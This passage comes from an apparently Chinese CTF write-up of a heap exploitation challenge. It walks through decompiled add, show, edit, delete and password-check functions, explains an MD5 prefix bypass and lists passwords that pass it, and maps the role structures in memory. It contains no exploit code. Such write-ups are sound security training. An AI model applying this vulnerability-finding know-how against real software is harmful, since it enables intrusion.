rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span> &amp;&amp; *(a1 + <span class="number">8LL</span> * i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Message is full!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(users + <span class="number">256</span>) &lt;= <span class="number">143</span> )</span><br><span class="line">      *(users + <span class="number">256</span>) = <span class="number">144</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message size: &quot;</span>);</span><br><span class="line">    v10 = input_int();</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">143</span> &amp;&amp; v10 &lt;= <span class="number">0x440</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(users + <span class="number">256</span>) = v10;</span><br><span class="line">      *(a1 + <span class="number">8LL</span> * i) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v10);</span><br><span class="line">      <span class="keyword">if</span> ( !*(a1 + <span class="number">8LL</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error calloc!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(a1 + <span class="number">4</span> * (i + <span class="number">48LL</span>)) = v10;</span><br><span class="line">      *(a1 + i + <span class="number">288</span>) = <span class="number">0</span>;</span><br><span class="line">      *(a1 + i + <span class="number">312</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v10 / <span class="number">48</span>; ++j )</span><br><span class="line">        sub_2DBC((*(a1 + <span class="number">8LL</span> * i) + <span class="number">48</span> * j + <span class="number">32LL</span>), <span class="number">16LL</span>);</span><br><span class="line">      v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0xE8</span>uLL);</span><br><span class="line">        v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        sub_2D09(v11, <span class="number">0xE8</span>LL);</span><br><span class="line">        v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里虽然是记录了上一个chunk的size但是并没有让后面的chunk的size必须大于等于上一个的。而且这里输入内容是这样的<code>sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);</code></p><p>通过上面可以看到peppa能够创建20个chunk，但是mummy只能创建10个chunk，最后的daddy只能创建5个chunk，并且最后一个chunk还是固定大小但是可以连续的写入内容。另外三个角色创建的最大chunk的size分别为：0x430，0x450，0x440 <strong>并且可以看到上面只存在calloc来申请chunk</strong></p><p>三个的show函数都挺类似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">show_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v4 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v4) &amp;&amp; *(a1 + <span class="number">4</span> * (v4 + <span class="number">48LL</span>)) &amp;&amp; !*(a1 + v4 + <span class="number">288</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *(a1 + <span class="number">8LL</span> * v4));</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到show函数只是验证了，chunk_arr不为空，chunk_size不为空，并且chunk_exist==0</p><p>再看edit函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">edit_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v5 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> &amp;&amp; v5 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v5) &amp;&amp; *(a1 + <span class="number">4</span> * (v5 + <span class="number">48LL</span>)) &amp;&amp; !*(a1 + v5 + <span class="number">288</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = *(a1 + <span class="number">4</span> * (v5 + <span class="number">48LL</span>)) / <span class="number">48</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !sub_2DBC((*(a1 + <span class="number">8LL</span> * v5) + <span class="number">48</span> * i), <span class="number">16LL</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是peppa的edit函数，这里的输入方式其实和再创建chunk的时候是一样的，并且验证的方式和show函数一样。</p><p>最后就是delete函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  v4 = input_int();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">8LL</span> * v4) &amp;&amp; !*(a1 + v4 + <span class="number">288</span>) &amp;&amp; !*(a1 + v4 + <span class="number">312</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(a1 + <span class="number">8LL</span> * v4));</span><br><span class="line">      *(a1 + v4 + <span class="number">288</span>) = <span class="number">1</span>;</span><br><span class="line">      *(a1 + v4 + <span class="number">312</span>) = <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里验证就是chunk_arr不为空，chunk_exist==0，chunk_freed==0，free之后将后面两个置为1。</p><p>在最后的更换身份的时候需要先验证密码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">check_pass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  _DWORD v5[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">88</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;Please enter the identity password of the corresponding user:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  sub_2D09(s, <span class="number">64LL</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;What&#x27;s this?&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((&amp;sub_13C8 + <span class="number">1</span>))();</span><br><span class="line">  sub_2916(v5, s, v4);</span><br><span class="line">  sub_2A8B(v5, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v7, &amp;unk_6906, <span class="number">0x11</span>uLL) || !<span class="built_in">memcmp</span>(v7, &amp;unk_6917, <span class="number">0x11</span>uLL) || !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;&lt;D&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] - <span class="number">0x41</span> &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x41</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x42</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Couldn&#x27;t find this password!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里s为我们输入的内容，v7为经过md5加密之后的内容，所以只要满足md5之后以’&lt;D’开头即可进入下面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Peppa&quot;</span>: <span class="string">&quot;A\x01\x95\xc9\x1c&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Mummy&quot;</span>: <span class="string">&quot;B\x01\x87\xc3\x19&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Daddy&quot;</span>: <span class="string">&quot;C\x01\xf7\x3c\x32&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据将角色状态复制给变量的过程可以看出来包括所有角色的结构体其实是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">all_pig</span>&#123;</span></span><br><span class="line">    Peppa_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Peppa_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Peppa_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Peppa_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Peppa_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">    Mummy_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Mummy_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Mummy_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Mummy_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Mummy_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">    Daddy_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Daddy_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Daddy_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Daddy_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Daddy_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将all_pig的内容给pig的内容的过程是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_3BEC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span 